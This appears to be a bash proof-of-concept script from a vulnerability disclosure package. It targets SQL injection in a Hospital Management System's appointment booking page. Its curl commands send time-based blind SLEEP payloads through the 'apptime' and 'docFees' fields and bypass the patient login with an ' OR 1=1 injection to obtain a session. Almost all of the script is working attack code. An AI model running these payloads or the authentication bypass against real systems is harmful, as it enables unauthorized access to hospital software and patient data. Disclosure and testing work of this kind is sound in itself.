#!/usr/bin/env bash
# Hospital-Management-System Appointment Booking SQL Injection - PoC
# Package: hms-appointment-sqli (HMS-07, admin-panel.php L42 dup-check SELECT + L45 INSERT)
# Usage: ./poc.sh http://<target-host>[:port]
# Harmless payloads: numeric SLEEP oracles only; no data extraction.
#
# Honest prerequisites (verified):
#   - Sink 1 (L42 duplicate-check SELECT) is injectable with NO session.
#   - Sink 2 (L45 INSERT) REQUIRES a patient session; unauthenticated attempts fail with
#     HTTP 500 (empty $pid -> values(,'',...) parse error). The session below is obtained
#     via the project's separate patient-login SQL injection (no valid credentials).

BASE="${1:-http://localhost:8000}"
JAR=$(mktemp)
SEL_PAYLOAD="x%27%20OR%20%28SELECT%20858%29%3E%28SELECT%20SLEEP%281%29%29--%20-"

echo "[*] Sink 1 (L42): unauthenticated baseline booking POST"
curl -s -o /dev/null -w '    status=%{http_code} time=%{time_total}s\n' -X POST "$BASE/admin-panel.php" \
  --data-urlencode "app-submit=1" \
  --data-urlencode "doctor=Ganesh" \
  --data-urlencode "docFees=550" \
  --data-urlencode "appdate=2027-01-03" \
  --data-urlencode "apptime=10:00"

echo "[*] Sink 1 (L42): unauthenticated time-based blind via apptime"
curl -s -o /dev/null -w '    status=%{http_code} time=%{time_total}s\n' -X POST "$BASE/admin-panel.php" \
  --data-urlencode "app-submit=1" \
  --data-urlencode "doctor=Ganesh" \
  --data-urlencode "docFees=550" \
  --data-urlencode "appdate=2027-01-03" \
  --data-urlencode "apptime=x' OR (SELECT 858)>(SELECT SLEEP(1))-- -"
# expect: time ~= appointmenttb row count x 1s (17 seeded rows -> ~18s)

echo "[*] Sink 2 (L45) negative control: INSERT attempt WITHOUT session (expect HTTP 500)"
curl -s -o /dev/null -w '    status=%{http_code} time=%{time_total}s\n' -X POST "$BASE/admin-panel.php" \
  --data-urlencode "app-submit=1" \
  --data-urlencode "doctor=Ganesh" \
  --data-urlencode "docFees=550" \
  --data-urlencode "appdate=2027-02-03" \
  --data-urlencode "apptime=10:00"

echo "[*] Patient session via login SQLi (no valid credentials; see hms-auth-bypass package)"
curl -s -c "$JAR" -o /dev/null -w '    status=%{http_code} redirect=%{redirect_url}\n' -X POST "$BASE/func.php" \
  --data-urlencode "patsub=1" \
  --data-urlencode "email=' OR 1=1 LIMIT 1#" \
  --data-urlencode "password2=x"

echo "[*] Sink 2 (L45) baseline with session (docFees=550)"
curl -s -b "$JAR" -o /dev/null -w '    status=%{http_code} time=%{time_total}s\n' -X POST "$BASE/admin-panel.php" \
  --data-urlencode "app-submit=1" \
  --data-urlencode "fname=x" --data-urlencode "lname=y" --data-urlencode "gender=m" \
  --data-urlencode "email=x@y.z" --data-urlencode "contact=999" \
  --data-urlencode "doctor=Ganesh" --data-urlencode "docFees=550" \
  --data-urlencode "appdate=2027-04-03" --data-urlencode "apptime=10:00"

echo "[*] Sink 2 (L45): INSERT injection via docFees = 1'+(SELECT SLEEP(2))+'1"
curl -s -b "$JAR" -o /dev/null -w '    status=%{http_code} time=%{time_total}s\n' -X POST "$BASE/admin-panel.php" \
  --data-urlencode "app-submit=1" \
  --data-urlencode "fname=x" --data-urlencode "lname=y" --data-urlencode "gender=m" \
  --data-urlencode "email=x@y.z" --data-urlencode "contact=999" \
  --data-urlencode "doctor=Ganesh" \
  --data-urlencode "docFees=1'+(SELECT SLEEP(2))+'1" \
  --data-urlencode "appdate=2027-04-03" \
  --data-urlencode "apptime=10:30"
# expect: ~2 s delay; stored-row proof:
#   SELECT ID,fname,docFees,appdate FROM appointmenttb WHERE appdate='2027-04-03';
#   -> docFees = 2 (the evaluated expression result)

rm -f "$JAR"
